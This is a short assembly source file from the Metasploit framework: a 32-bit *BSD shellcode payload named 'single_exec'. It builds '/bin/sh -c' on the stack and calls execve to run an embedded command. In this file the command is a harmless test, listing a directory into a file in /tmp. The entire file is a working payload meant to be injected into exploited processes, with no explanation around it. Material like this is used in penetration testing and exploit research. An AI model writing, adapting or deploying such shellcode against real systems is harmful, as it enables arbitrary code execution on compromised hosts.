;;
;
;        Name: single_exec
;   Platforms: *BSD 
;     Authors: vlad902 <vlad902 [at] gmail.com>
;     Version: $Revision: 1499 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Execute an arbitary command.
;
;;
; NULLs are fair game.

BITS 32
global main

main:
  push	byte 0x3b
  pop	eax
  cdq

  push	edx
  push	word 0x632d
  mov	edi, esp

  push	edx
  push	dword 0x68732f6e
  push	dword 0x69622f2f
  mov	ebx, esp

  push	edx
  call	getstr
db "/bin/ls > /tmp/test_single_exec", 0x00
getstr:
  push	edi
  push	ebx
  mov	ecx, esp
  push	edx
  push	ecx
  push	ebx
  push	eax
  int	0x80
